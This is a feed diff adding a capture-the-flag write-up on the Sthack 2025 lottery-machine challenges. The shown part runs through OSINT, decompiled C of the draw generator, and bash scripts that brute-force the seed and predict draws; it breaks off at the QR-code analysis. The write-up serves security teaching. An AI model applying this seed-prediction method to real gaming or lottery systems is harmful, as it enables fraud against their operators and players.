@@ -6,8 +6,337 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sun, 27 Apr 2025 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Tue, 27 May 2025 00:00:00 +0000</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>🇬🇧 Sthack 2025 - Sthack&#39;Millions</title>
+            <link>/posts/2025/05/sthack-2025-sthackmillions/</link>
+            <pubDate>Tue, 27 May 2025 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/2025/05/sthack-2025-sthackmillions/</guid>
+            <description>&lt;h3 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h3&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#introduction&#34;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#14---osint&#34;&gt;1/4 - OSINT&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#taking-a-look-at-the-machine-itself&#34;&gt;Taking a look at the machine&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#searching-up-the-web&#34;&gt;Searching the web&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#exploring-the-repository&#34;&gt;Exploring the repository&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#24---reverse&#34;&gt;2/4 - Reverse&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#inspecting-the-executables&#34;&gt;Inspecting the executables&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#static-analysis&#34;&gt;Static analysis&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#putting-it-all-together&#34;&gt;Putting it all together&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#getting-the-current-seed&#34;&gt;Getting the current seed&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#predicting-the-draws&#34;&gt;Predicting the draws&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#34---misc&#34;&gt;3/4 - Misc (Arbitrary File Read)&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#analysing-the-qr-code&#34;&gt;Analysing the QR Code&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#arbitrary-file-read&#34;&gt;Arbitrary File Read&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#44---misc&#34;&gt;4/4 - Misc (Jackpot)&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#analysing-the-qr-code&#34;&gt;Understanding the signature&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#arbitrary-file-read&#34;&gt;Crafting a Jackpot ticket&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/2025/05/sthack-2025-sthackmillions/#conclusion&#34;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Sthack&amp;rsquo;Millions&lt;/strong&gt; was a series of 4 challenges involving &lt;code&gt;OSINT&lt;/code&gt;, &lt;code&gt;Reversing&lt;/code&gt;, and &lt;code&gt;Misc&lt;/code&gt;. It was very interesting, not only because of the challenges themselves (which were very fun to do), but also because the challmakers actually built the machine that went along with the challenge. So we had a physical support, which made the whole experience even cooler.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of Contents</h3>
+<hr>
+<ul>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#introduction">Introduction</a></li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#14---osint">1/4 - OSINT</a>
+<ul>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#taking-a-look-at-the-machine-itself">Taking a look at the machine</a></li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#searching-up-the-web">Searching the web</a></li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#exploring-the-repository">Exploring the repository</a></li>
+</ul>
+</li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#24---reverse">2/4 - Reverse</a>
+<ul>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#inspecting-the-executables">Inspecting the executables</a></li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#static-analysis">Static analysis</a></li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#putting-it-all-together">Putting it all together</a></li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#getting-the-current-seed">Getting the current seed</a></li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#predicting-the-draws">Predicting the draws</a></li>
+</ul>
+</li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#34---misc">3/4 - Misc (Arbitrary File Read)</a>
+<ul>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#analysing-the-qr-code">Analysing the QR Code</a></li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#arbitrary-file-read">Arbitrary File Read</a></li>
+</ul>
+</li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#44---misc">4/4 - Misc (Jackpot)</a>
+<ul>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#analysing-the-qr-code">Understanding the signature</a></li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#arbitrary-file-read">Crafting a Jackpot ticket</a></li>
+</ul>
+</li>
+<li><a href="/posts/2025/05/sthack-2025-sthackmillions/#conclusion">Conclusion</a></li>
+</ul>
+<hr>
+<h1 id="introduction">Introduction</h1>
+<p><strong>Sthack&rsquo;Millions</strong> was a series of 4 challenges involving <code>OSINT</code>, <code>Reversing</code>, and <code>Misc</code>. It was very interesting, not only because of the challenges themselves (which were very fun to do), but also because the challmakers actually built the machine that went along with the challenge. So we had a physical support, which made the whole experience even cooler.</p>
+<p>The said machine was a classic lottery machine: you could either click &ldquo;Play&rdquo; and make a grid (5 numbers and one bonus number), which would then print out a ticket with a QR code, or check your grid by scanning the QR code and see if you won.</p>
+<p>The final goal of this series was to get the <em>Jackpot</em>, a.k.a. having the correct 5 numbers <strong>and</strong> the bonus number.</p>
+<h1 id="14---osint">1/4 - OSINT</h1>
+<h2 id="taking-a-look-at-the-machine-itself">Taking a look at the machine itself</h2>
+<p>The machine looked like an arcade machine, covered in satirical stickers.</p>
+<p><img src="https://i.ibb.co/x8jNC65R/IMG-1562.jpg" alt="machine_large.png"></p>
+<p>Even though they were funny, most of them were useless, except for one.</p>
+<p><img src="https://i.ibb.co/YBBLBTqG/2025-05-27-135909-153x260-scrot.png" alt="sticker.png"></p>
+<p>Here we have a very useful hint: this machine is powered by a software called <em>Lotogiciel</em>, and it&rsquo;s even trademarked!</p>
+<h2 id="searching-up-the-web">Searching up the web</h2>
+<p>Despite not being a dorking expert, I still tried to search up this keyword but without success.</p>
+<p>It then occurred to me that there aren’t many websites that host source code for software, so I typed <em>Lotogiciel</em> on GitHub, and found something.</p>
+<p><img src="https://i.ibb.co/Y4cjrYMv/2025-05-27-140432-913x279-scrot.png" alt="github.png"></p>
+<p>Since the commit&rsquo;s author is <code>hessman</code>, we can assume this repo is linked to the CTF.</p>
+<h2 id="exploring-the-repository">Exploring the repository</h2>
+<p>We notice two files here that are probably compiled executables.</p>
+<p>The repository has three commits, which is a bit too much for just uploading two files, and not enough for an actual programming project, so let&rsquo;s take a look at them.</p>
+<p><img src="https://i.ibb.co/23jmfHwX/2025-05-27-140916-1473x456-scrot.png" alt="commit.png"></p>
+<p>The second commit, called <em>info</em>, held the flag for the first step of this series!</p>
+<h1 id="24---reverse">2/4 - Reverse</h1>
+<p>Now let&rsquo;s clone the repo and take a look at these two executables.</p>
+<h2 id="inspecting-the-executables">Inspecting the executables</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lotogiciel: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>SYSV<span style="color:#ff79c6">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#ff79c6">[</span>sha1<span style="color:#ff79c6">]=</span>c1977b3e031316cf2b2ef5366d65ae7793a01c03, <span style="color:#ff79c6">for</span> GNU/Linux 4.4.0, not stripped
+</span></span></code></pre></div><p><img src="https://i.imgflip.com/9vbuj9.jpg" alt="meme"></p>
+<p>One of the two executables is compiled for <code>aarch64</code> and the other for <code>x86-64</code>, but they seem to both originate from the same source code (based on the strings).</p>
+<h2 id="static-analysis">Static analysis</h2>
+<p>After renaming most of the variables, here is how the code articulates itself:</p>
+<ul>
+<li>Reads the seed from <code>index.txt</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  seed_file <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(<span style="color:#f1fa8c">&#34;index.txt&#34;</span>,<span style="color:#f1fa8c">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (seed_file <span style="color:#ff79c6">!=</span> (FILE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>) {
+</span></span><span style="display:flex;"><span>    read_result <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fgets</span>(seed_buffer,<span style="color:#bd93f9">0x20</span>,seed_file);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (read_result <span style="color:#ff79c6">==</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">fclose</span>(seed_file);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">fclose</span>(seed_file);
+</span></span></code></pre></div><ul>
+<li>Gets time info, controls and normalizes the seed</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">fclose</span>(seed_file);
+</span></span><span style="display:flex;"><span>      counter <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">__isoc23_strtol</span>(seed_buffer,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">10</span>);
+</span></span><span style="display:flex;"><span>      draw_time <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">time</span>((<span style="color:#8be9fd">time_t</span> <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>);
+</span></span><span style="display:flex;"><span>      draw_time_info <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">localtime</span>(<span style="color:#ff79c6">&amp;</span>draw_time);
+</span></span><span style="display:flex;"><span>      current_seed <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;</span> counter) {
+</span></span><span style="display:flex;"><span>        current_seed <span style="color:#ff79c6">=</span> counter;
+</span></span><span style="display:flex;"><span>      }
+</span></span></code></pre></div><ul>
+<li>Generates the numbers</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (current_seed <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10U</span> <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">3001</span>) {
+</span></span><span style="display:flex;"><span>        num_pointer <span style="color:#ff79c6">=</span> winning_numbers;
+</span></span><span style="display:flex;"><span>        draw_minutes <span style="color:#ff79c6">=</span> draw_time_info<span style="color:#ff79c6">-&gt;</span>tm_min;
+</span></span><span style="display:flex;"><span>        i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>        numbers_ptr <span style="color:#ff79c6">=</span> num_pointer;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span>( <span style="color:#8be9fd;font-style:italic">true</span> ) {
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">while</span>( <span style="color:#8be9fd;font-style:italic">true</span> ) {
+</span></span><span style="display:flex;"><span>            number <span style="color:#ff79c6">=</span> ((<span style="color:#8be9fd">char</span>)(<span style="color:#ff79c6">&amp;</span>pi_decimals)[i <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> current_seed] <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x30</span> <span style="color:#ff79c6">+</span>
+</span></span><span style="display:flex;"><span>                      ((<span style="color:#8be9fd">char</span>)(<span style="color:#ff79c6">&amp;</span>pi_decimals_2)[i <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> current_seed] <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">5</span> <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">0xf0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> draw_minutes)
+</span></span><span style="display:flex;"><span>                     <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">49</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>numbers_ptr <span style="color:#ff79c6">=</span> number;
+</span></span><span style="display:flex;"><span>            puVar2 <span style="color:#ff79c6">=</span> num_pointer;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (i <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>            numbers_ptr <span style="color:#ff79c6">=</span> numbers_ptr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>            i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">while</span>( <span style="color:#8be9fd;font-style:italic">true</span> ) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">*</span>puVar2 <span style="color:#ff79c6">==</span> number) {
+</span></span><span style="display:flex;"><span>              <span style="color:#ff79c6">do</span> {
+</span></span><span style="display:flex;"><span>                number <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">int</span>)number <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">0x31</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">*</span>numbers_ptr <span style="color:#ff79c6">=</span> number;
+</span></span><span style="display:flex;"><span>              } <span style="color:#ff79c6">while</span> (number <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">*</span>puVar2);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            puVar2 <span style="color:#ff79c6">=</span> puVar2 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (numbers_ptr <span style="color:#ff79c6">==</span> puVar2) <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>            number <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>numbers_ptr;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          i <span style="color:#ff79c6">=</span> i <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (i <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">5</span>) <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>          numbers_ptr <span style="color:#ff79c6">=</span> numbers_ptr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><blockquote>
+<p>The seed can&rsquo;t be higher than 3000.</p></blockquote>
+<blockquote>
+<p>Numbers can&rsquo;t be higher than 49.</p></blockquote>
+<blockquote>
+<p>There can be no duplicates.</p></blockquote>
+<blockquote>
+<p>Uses the current time to pick numbers from <em>pi</em> decimals.</p></blockquote>
+<ul>
+<li>Prints out the winning numbers</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        <span style="color:#ff79c6">do</span> {
+</span></span><span style="display:flex;"><span>          number <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>num_pointer;
+</span></span><span style="display:flex;"><span>          num_pointer <span style="color:#ff79c6">=</span> num_pointer <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34; %02d&#34;</span>,(ulong)number);
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">while</span> (end_marker <span style="color:#ff79c6">!=</span> num_pointer);
+</span></span></code></pre></div><ul>
+<li>Increments the seed</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        seed_file <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(<span style="color:#f1fa8c">&#34;index.txt&#34;</span>,<span style="color:#f1fa8c">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (seed_file <span style="color:#ff79c6">!=</span> (FILE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">fprintf</span>(seed_file,<span style="color:#f1fa8c">&#34;%ld</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,(current_seed <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10U</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">3000</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">fclose</span>(seed_file);
+</span></span><span style="display:flex;"><span>          uVar1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">goto</span> LAB_00101304;
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><blockquote>
+<p>The seed is simply incremented by 10.</p></blockquote>
+<h2 id="putting-it-all-together">Putting it all together</h2>
+<p>There are multiple interesting things here that show that the randomness of this generator can be predicted.</p>
+<p>We can run the program with a simple seed <code>1234</code> to check that we understood how it works.</p>
+<p><img src="https://i.ibb.co/ynS8cKkT/2025-05-27-143952-616x44-scrot.png" alt="first_draw.png"></p>
+<p>We indeed get a set of 5 numbers, so that confirms our understanding.</p>
+<p>Some key takeaways:</p>
+<ul>
+<li>
+<p>The next seed is predictable since the program only increments it by 10 on each draw.</p>
+</li>
+<li>
+<p>Seeds can&rsquo;t be higher than <em>3000</em>, which is not a lot and can be bruteforced.</p>
+</li>
+<li>
+<p>The program uses the current time (and the seed) to pick numbers.</p>
+</li>
+</ul>
+<h2 id="getting-the-current-seed">Getting the current seed</h2>
+<p>If we want to predict the next draw&rsquo;s result on the machine, we need to know what seed the last draw used. So let&rsquo;s go check what the last draw was.</p>
+<p><img src="https://i.ibb.co/kg5WGmG5/IMG-1570.jpg" alt="current_draw.png"></p>
+<p>We&rsquo;ll make a script to list all the possible draws at this exact time using <code>faketime</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>DATE_STR<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;2025-05-23 01:11:54&#34;</span> 
+</span></span><span style="display:flex;"><span>START_SEED<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>END_SEED<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> SEED <span style="color:#ff79c6">in</span> $(seq <span style="color:#f1fa8c">&#34;$START_SEED&#34;</span> <span style="color:#f1fa8c">&#34;$END_SEED&#34;</span>); <span style="color:#ff79c6">do</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#f1fa8c">&#34;$SEED&#34;</span> <span style="color:#ff79c6">&gt;</span> <span style="color:#f1fa8c">&#34;index.txt&#34;</span>
+</span></span><span style="display:flex;"><span>    RESULT<span style="color:#ff79c6">=</span>$(faketime <span style="color:#f1fa8c">&#34;$DATE_STR&#34;</span> <span style="color:#f1fa8c">&#34;./lotogiciel&#34;</span> <span style="color:#bd93f9">2</span><span style="color:#ff79c6">&gt;</span>/dev/null)
+</span></span><span style="display:flex;"><span>    printf <span style="color:#f1fa8c">&#34;%d %s\n&#34;</span> <span style="color:#f1fa8c">&#34;$SEED&#34;</span> <span style="color:#f1fa8c">&#34;$RESULT&#34;</span> <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#f1fa8c">&#34;results.txt&#34;</span>
+</span></span><span style="display:flex;"><span>done
+</span></span></code></pre></div><p>Now, we have a <code>results.txt</code> file that should contain the draw that happened on the machine at <code>01:11</code> -&gt; [<em>21</em>, <em>11</em>, <em>3</em>, <em>26</em>, <em>16</em>]</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@e945e59da411:/app# grep &#34;21 11 03 26 16&#34; results.txt
+</span></span><span style="display:flex;"><span>2360  21 11 03 26 16
+</span></span></code></pre></div><p>Great, we know the seed at <code>01:11</code> was <code>2360</code>!</p>
+<h2 id="predicting-the-draws">Predicting the draws</h2>
+<p>Now we’ll make a script that takes the time of a draw, calculates the corresponding seed, and gives us the result!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span># usage <span style="color:#ff79c6">:</span> .<span style="color:#ff79c6">/</span>automate.sh HH<span style="color:#ff79c6">:</span>MM<span style="color:#ff79c6">:</span>SS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>REF_DATE<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;2025-05-23&#34;</span>
+</span></span><span style="display:flex;"><span>REF_TIME<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;01:11:54&#34;</span>
+</span></span><span style="display:flex;"><span>REF_SEED<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2360</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>STEP_SEC<span style="color:#ff79c6">=</span>$((<span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">60</span>))
+</span></span><span style="display:flex;"><span>SEED_STEP<span style="color:#ff79c6">=</span><span style="color:#bd93f9">10</span>
+</span></span><span style="display:flex;"><span>MODULO<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[[ $# <span style="color:#ff79c6">-</span>lt <span style="color:#bd93f9">1</span> ]] <span style="color:#ff79c6">&amp;&amp;</span> { echo <span style="color:#f1fa8c">&#34;Usage: $0 HH:MM:SS&#34;</span>; exit <span style="color:#bd93f9">1</span>; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TIME_STR<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;$1&#34;</span>
+</span></span><span style="display:flex;"><span>DATE_STR<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;${2:-$REF_DATE}&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t_target<span style="color:#ff79c6">=</span>$(date <span style="color:#ff79c6">-</span>d <span style="color:#f1fa8c">&#34;$DATE_STR $TIME_STR&#34;</span> <span style="color:#ff79c6">+%</span>s)
+</span></span><span style="display:flex;"><span>t_ref<span style="color:#ff79c6">=</span>$(date   <span style="color:#ff79c6">-</span>d <span style="color:#f1fa8c">&#34;$REF_DATE $REF_TIME&#34;</span>  <span style="color:#ff79c6">+%</span>s)
+</span></span><span style="display:flex;"><span>diff<span style="color:#ff79c6">=</span>$((t_target <span style="color:#ff79c6">-</span> t_ref))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>steps<span style="color:#ff79c6">=</span>$((diff <span style="color:#ff79c6">/</span> STEP_SEC))
+</span></span><span style="display:flex;"><span>(( diff <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> diff <span style="color:#ff79c6">%</span> STEP_SEC )) <span style="color:#ff79c6">&amp;&amp;</span> (( steps<span style="color:#ff79c6">--</span> ))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>seed<span style="color:#ff79c6">=</span>$(( (REF_SEED <span style="color:#ff79c6">+</span> steps <span style="color:#ff79c6">*</span> SEED_STEP) <span style="color:#ff79c6">%</span> MODULO ))
+</span></span><span style="display:flex;"><span>(( seed <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span> )) <span style="color:#ff79c6">&amp;&amp;</span> seed<span style="color:#ff79c6">=</span>$(( seed <span style="color:#ff79c6">+</span> MODULO ))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#f1fa8c">&#34;$seed&#34;</span> <span style="color:#ff79c6">&gt;</span> index.txt
+</span></span><span style="display:flex;"><span>draw<span style="color:#ff79c6">=</span>$(faketime <span style="color:#f1fa8c">&#34;$DATE_STR $TIME_STR&#34;</span> .<span style="color:#ff79c6">/</span>lotogiciel <span style="color:#bd93f9">2</span><span style="color:#ff79c6">&gt;</span>/dev/null)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>printf <span style="color:#f1fa8c">&#34;Heure  : %s %s\nSeed   : %d\nTirage : %s\n&#34;</span> <span style="color:#ff79c6">\</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f1fa8c">&#34;$DATE_STR&#34;</span> <span style="color:#f1fa8c">&#34;$TIME_STR&#34;</span> <span style="color:#f1fa8c">&#34;$seed&#34;</span> <span style="color:#f1fa8c">&#34;$draw&#34;</span>
+</span></span></code></pre></div><p><img src="https://i.ibb.co/Fq0g14vY/2025-05-27-150653-472x88-scrot.png" alt="winning_draw.png"></p>
+<p>Let’s verify that our script works by playing this grid on the machine and scanning the ticket after the draw.</p>
+<p><img src="https://i.ibb.co/JDZBsqd/IMG-1572.jpg" alt="ticket"></p>
+<h1 id="34---misc">3/4 - Misc</h1>
+<p>We don’t have much else to work on now that we can predict the draws, so let’s dive into the last thing we didn’t look at: the QR code.</p>
+<h2 id="analysing-the-qr-code">Analysing the QR code</h2>
+<p>The ticket’s QR code holds JSON that looks like this:</p>
